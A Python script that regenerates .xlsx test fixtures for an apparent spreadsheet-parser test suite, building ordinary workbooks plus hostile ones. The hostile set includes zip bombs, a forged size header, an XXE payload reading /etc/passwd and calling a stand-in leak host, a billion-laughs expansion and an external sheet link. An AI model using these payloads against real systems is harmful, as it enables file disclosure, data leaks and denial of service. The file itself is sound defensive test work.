"""Regenerate the .xlsx fixtures in this directory.

Every workbook is written by a real producer: LibreOffice (soffice
--convert-to), openpyxl or XlsxWriter. The hostile files start from one of
those workbooks and change it the way an attacker would, with Python's
zipfile module. README.md records the producer and version of each file and
the SHA-256 of the committed bytes.

LibreOffice and openpyxl store timestamps, so a rerun gives different bytes.
The committed files are the reference; rerun only to add or replace a fixture
and then update README.md.

Usage, from the repository root:

    python3 -I tests/fixtures/xlsx/generate.py
"""

import datetime
import hashlib
import os
import shutil
import subprocess
import sys
import tempfile
import zipfile

import openpyxl
import xlsxwriter
from openpyxl.cell.rich_text import CellRichText, TextBlock
from openpyxl.cell.text import InlineFont
from openpyxl.utils.datetime import CALENDAR_MAC_1904

HERE = os.path.dirname(os.path.abspath(__file__))
FIXTURES = os.path.dirname(HERE)
MIB = 1024 * 1024


def out(name):
    return os.path.join(HERE, name)


def libreoffice_convert(source, target_name, infilter=None):
    """Convert one file to .xlsx with headless LibreOffice."""
    with tempfile.TemporaryDirectory() as work:
        profile = os.path.join(work, "profile")
        command = [
            "soffice",
            f"-env:UserInstallation=file://{profile}",
            "--headless",
            "--convert-to",
            "xlsx",
            "--outdir",
            work,
        ]
        if infilter:
            command.append(f"--infilter={infilter}")
        command.append(source)
        subprocess.run(command, check=True, capture_output=True)
        produced = os.path.join(
            work, os.path.splitext(os.path.basename(source))[0] + ".xlsx"
        )
        shutil.move(produced, out(target_name))


def libreoffice_document_smoke():
    # The CSV filter options are: comma separator (44), double-quote text
    # delimiter (34), UTF-8 (76), start at line 1.
    libreoffice_convert(
        os.path.join(FIXTURES, "document-smoke.csv"),
        "libreoffice-document-smoke.xlsx",
        infilter="CSV:44,34,76,1",
    )


def openpyxl_features():
    workbook = openpyxl.Workbook()
    hidden = workbook.active
    hidden.title = "Hidden first"
    hidden["A1"] = "this sheet is hidden and must not open by default"
    hidden.sheet_state = "hidden"

    types = workbook.create_sheet("Types")
    rows = [
        ("kind", "value", None),
        ("shared string", "plain text", None),
        ("integer", 42, None),
        ("float", 0.1 + 0.2, None),
        ("small float", -1.5e-10, None),
        ("boolean true", True, None),
        ("boolean false", False, None),
        ("date", datetime.date(2024, 2, 29), None),
        ("datetime", datetime.datetime(2024, 2, 29, 13, 45, 30), None),
        ("time", datetime.time(6, 30, 15), None),
        ("custom date format", datetime.date(1999, 12, 31), "dd/mm/yyyy"),
        ("built-in format 14", datetime.date(2000, 1, 1), "mm-dd-yy"),
        ("percent format", 0.25, "0.00%"),
        ("quoted letters", 12345, '"Day "0'),
        ("error", "#DIV/0!", None),
        ("formula without cached value", "=1+2", None),
        ("whitespace", "line1\nline2\ttab  two spaces ", None),
        ("elapsed hours", 1.5, "[h]:mm:ss"),
        ("rich text", None, None),
        ("serial 59", 59, "yyyy-mm-dd"),
        ("serial 60", 60, "yyyy-mm-dd"),
        ("serial 61", 61, "yyyy-mm-dd"),
        ("serial 0", 0, "yyyy-mm-dd"),
        ("negative serial", -1, "yyyy-mm-dd"),
        ("rounds to next day", 45351.999999, "yyyy-mm-dd hh:mm:ss"),
        ("text that looks like a number", "007", None),
    ]
    for index, (kind, value, number_format) in enumerate(rows, start=1):
        types.cell(row=index, column=1, value=kind)
        if value is not None:
            cell = types.cell(row=index, column=2, value=value)
            if number_format:
                cell.number_format = number_format
    types["B19"] = CellRichText(
        [TextBlock(InlineFont(b=True), "bold"), " and plain"]
    )

    sparse = workbook.create_sheet("Sparse")
    sparse["A1"] = "top-left"
    sparse["C3"] = "C3"
    sparse["J10"] = "J10"
    sparse["BR12"] = "column 70"
    sparse["A1048576"] = "last row"

    second = workbook.create_sheet("Second visible")
    second["A1"] = "second visible sheet"

    very_hidden = workbook.create_sheet("Very hidden")
    very_hidden["A1"] = "very hidden"
    very_hidden.sheet_state = "veryHidden"

    workbook.save(out("openpyxl-features.xlsx"))


def openpyxl_1904():
    workbook = openpyxl.Workbook()
    workbook.epoch = CALENDAR_MAC_1904
    sheet = workbook.active
    sheet.title = "Dates 1904"
    sheet["A1"] = datetime.date(2024, 2, 29)
    sheet["A2"] = 0
    sheet["A2"].number_format = "yyyy-mm-dd"
    sheet["A3"] = datetime.datetime(1904, 1, 2, 12, 0, 0)
    workbook.save(out("openpyxl-1904.xlsx"))


def xlsxwriter_features():
    workbook = xlsxwriter.Workbook(out("xlsxwriter-features.xlsx"))
    sheet = workbook.add_worksheet("Features")
    bold = workbook.add_format({"bold": True})
    date_time = workbook.add_format({"num_format": "yyyy-mm-dd hh:mm"})
    time_only = workbook.add_format({"num_format": "hh:mm:ss"})
    sheet.write_rich_string("A1", bold, "bold", " and plain")
    sheet.write_formula("A2", "=1+1", None, 2)
    sheet.write_formula("A3", '="a"&"b"', None, "ab")
    sheet.write_formula("A4", "=1=1", None, True)
    sheet.write_formula("A5", "=1/0", None, "#DIV/0!")
    sheet.write_boolean("A6", False)
    sheet.write_datetime("A7", datetime.datetime(2023, 7, 14, 9, 5), date_time)
    sheet.write_datetime("A8", datetime.time(23, 59, 59), time_only)
    sheet.write_string("A9", "a\x01b")
    sheet.write_number("A10", 1e20)
    sheet.write_number("A11", 3.14159)
    sheet.write_string("D12", "only D12")
    sheet.write_formula("A13", "=SUM(A2:A2)", None, 0)
    sheet.write_string("A14", "")
    sheet.write_blank("C14", None, bold)
    second = workbook.add_worksheet("Second")
    second.write_string("A1", "second sheet")
    workbook.close()


def xlsxwriter_inline_strings():
    workbook = xlsxwriter.Workbook(
        out("xlsxwriter-inline-strings.xlsx"), {"constant_memory": True}
    )
    sheet = workbook.add_worksheet("Inline")
    bold = workbook.add_format({"bold": True})
    sheet.write_string("A1", "inline text")
    sheet.write_rich_string("B1", bold, "rich", " inline")
    sheet.write_string("A2", " leading and trailing ")
    sheet.write_number("B2", 7)
    workbook.close()


LARGE_ROWS = 120_000


def xlsxwriter_large():
    # Default mode: strings go to the shared string table, as Excel does.
    workbook = xlsxwriter.Workbook(out("xlsxwriter-large.xlsx"))
    sheet = workbook.add_worksheet("Large")
    date_format = workbook.add_format({"num_format": "yyyy-mm-dd"})
    headers = ["id", "name", "amount", "date", "flag", "category"]
    for column, header in enumerate(headers):
        sheet.write_string(0, column, header)
    categories = ["north", "south", "east", "west"]
    start = datetime.date(2020, 1, 1)
    for row in range(1, LARGE_ROWS + 1):
        sheet.write_number(row, 0, row)
        sheet.write_string(row, 1, f"name-{row:06d}")
        sheet.write_number(row, 2, row * 0.25)
        sheet.write_datetime(
            row, 3, start + datetime.timedelta(days=row % 3650), date_format
        )
        sheet.write_boolean(row, 4, row % 2 == 0)
        sheet.write_string(row, 5, categories[row % 4])
    workbook.close()


def libreoffice_resaved():
    # LibreOffice reads the openpyxl workbook and writes its own parts, styles
    # and shared strings.
    with tempfile.TemporaryDirectory() as work:
        source = os.path.join(work, "libreoffice-resaved.xlsx")
        shutil.copy(out("openpyxl-features.xlsx"), source)
        converted = os.path.join(work, "converted")
        os.mkdir(converted)
        profile = os.path.join(work, "profile")
        subprocess.run(
            [
                "soffice",
                f"-env:UserInstallation=file://{profile}",
                "--headless",
                "--convert-to",
                "xlsx:Calc MS Excel 2007 XML",
                "--outdir",
                converted,
                source,
            ],
            check=True,
            capture_output=True,
        )
        shutil.move(
            os.path.join(converted, "libreoffice-resaved.xlsx"),
            out("libreoffice-resaved.xlsx"),
        )


def rewrite_zip(source_name, target_name, replace):
    """Copy a workbook, replacing some entries. replace maps name -> bytes."""
    with zipfile.ZipFile(out(source_name)) as source, zipfile.ZipFile(
        out(target_name), "w", zipfile.ZIP_DEFLATED
    ) as target:
        for info in source.infolist():
            data = replace.get(info.filename)
            if data is None:
                data = source.read(info.filename)
            target.writestr(info.filename, data)


def write_bomb(target_name, uncompressed_bytes):
    """Replace the first sheet with a long run of empty rows."""
    head = (
        b'<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n'
        b'<worksheet xmlns="http://schemas.openxmlformats.org/'
        b'spreadsheetml/2006/main"><sheetData>'
    )
    tail = b"</sheetData></worksheet>"
    unit = b"<row/>" * 4096
    with zipfile.ZipFile(out("libreoffice-document-smoke.xlsx")) as source, zipfile.ZipFile(
        out(target_name), "w", zipfile.ZIP_DEFLATED, compresslevel=9
    ) as target:
        for info in source.infolist():
            if info.filename != "xl/worksheets/sheet1.xml":
                target.writestr(info.filename, source.read(info.filename))
                continue
            with target.open(info.filename, "w", force_zip64=False) as stream:
                stream.write(head)
                written = len(head)
                while written + len(unit) + len(tail) <= uncompressed_bytes:
                    stream.write(unit)
                    written += len(unit)
                stream.write(tail)


def patch_declared_size(source_name, target_name, entry, factor):
    """Make the headers claim a smaller uncompressed size for one entry."""
    shutil.copy(out(source_name), out(target_name))
    with zipfile.ZipFile(out(target_name)) as archive:
        info = archive.getinfo(entry)
    claimed = info.compress_size * factor
    data = bytearray(open(out(target_name), "rb").read())
    old = info.file_size.to_bytes(4, "little")
    new = claimed.to_bytes(4, "little")
    # Local header: uncompressed size at offset 22.
    local = info.header_offset
    assert data[local + 22 : local + 26] == old
    data[local + 22 : local + 26] = new
    # Central directory record for the same entry.
    marker = b"PK\x01\x02"
    position = data.find(marker)
    while position != -1:
        name_length = int.from_bytes(data[position + 28 : position + 30], "little")
        name = bytes(data[position + 46 : position + 46 + name_length])
        if name == entry.encode():
            assert data[position + 24 : position + 28] == old
            data[position + 24 : position + 28] = new
            break
        position = data.find(marker, position + 4)
    else:
        raise RuntimeError("central directory entry not found")
    open(out(target_name), "wb").write(data)


def hostile_files():
    write_bomb("hostile-bomb-ratio.xlsx", 100 * MIB)
    write_bomb("hostile-bomb-size.xlsx", 1100 * MIB)
    patch_declared_size(
        "hostile-bomb-ratio.xlsx",
        "hostile-size-lie.xlsx",
        "xl/worksheets/sheet1.xml",
        100,
    )

    data = open(out("openpyxl-features.xlsx"), "rb").read()
    open(out("hostile-truncated.xlsx"), "wb").write(data[: len(data) * 6 // 10])

    with zipfile.ZipFile(out("libreoffice-document-smoke.xlsx")) as source:
        sheet = source.read("xl/worksheets/sheet1.xml").decode()
    declaration_end = sheet.index("?>") + 2
    xxe_sheet = (
        sheet[:declaration_end]
        + '\n<!DOCTYPE worksheet [<!ENTITY xxe SYSTEM "file:///etc/passwd">'
        + '<!ENTITY web SYSTEM "http://example.invalid/leak">]>'
        + sheet[declaration_end:].replace(
            "<sheetData>",
            '<sheetData><row r="1"><c r="A1" t="inlineStr"><is><t>&xxe;&web;</t></is></c></row>',
            1,
        )
    )
    rewrite_zip(
        "libreoffice-document-smoke.xlsx",
        "hostile-doctype-xxe.xlsx",
        {"xl/worksheets/sheet1.xml": xxe_sheet.encode()},
    )

    laughs = ['<!ENTITY lol0 "lol">']
    for level in range(1, 10):
        previous = f"&lol{level - 1};" * 10
        laughs.append(f'<!ENTITY lol{level} "{previous}">')
    with zipfile.ZipFile(out("libreoffice-document-smoke.xlsx")) as source:
        strings = source.read("xl/sharedStrings.xml").decode()
    declaration_end = strings.index("?>") + 2
    laugh_strings = (
        strings[:declaration_end]
        + "\n<!DOCTYPE sst ["
        + "".join(laughs)
        + "]>"
        + strings[declaration_end:].replace("<t>", "<t>&lol9;", 1)
    )
    rewrite_zip(
        "libreoffice-document-smoke.xlsx",
        "hostile-billion-laughs.xlsx",
        {"xl/sharedStrings.xml": laugh_strings.encode()},
    )

    with zipfile.ZipFile(out("libreoffice-document-smoke.xlsx")) as source:
        rels = source.read("xl/_rels/workbook.xml.rels").decode()
    external = rels.replace(
        'Target="worksheets/sheet1.xml"',
        'Target="http://example.invalid/sheet1.xml" TargetMode="External"',
    )
    if external == rels:
        raise RuntimeError("worksheet relationship not found")
    rewrite_zip(
        "libreoffice-document-smoke.xlsx",
        "hostile-external-sheet.xlsx",
        {"xl/_rels/workbook.xml.rels": external.encode()},
    )


def main():
    libreoffice_document_smoke()
    openpyxl_features()
    openpyxl_1904()
    xlsxwriter_features()
    xlsxwriter_inline_strings()
    xlsxwriter_large()
    libreoffice_resaved()
    hostile_files()
    for name in sorted(os.listdir(HERE)):
        if name.endswith(".xlsx"):
            digest = hashlib.sha256(open(out(name), "rb").read()).hexdigest()
            print(f"{name} {os.path.getsize(out(name))} {digest}")
    soffice = subprocess.run(
        ["soffice", "--version"], check=True, capture_output=True, text=True
    ).stdout.strip()
    print(f"python {sys.version.split()[0]}")
    print(f"openpyxl {openpyxl.__version__}")
    print(f"XlsxWriter {xlsxwriter.__version__}")
    print(soffice)


if __name__ == "__main__":
    main()
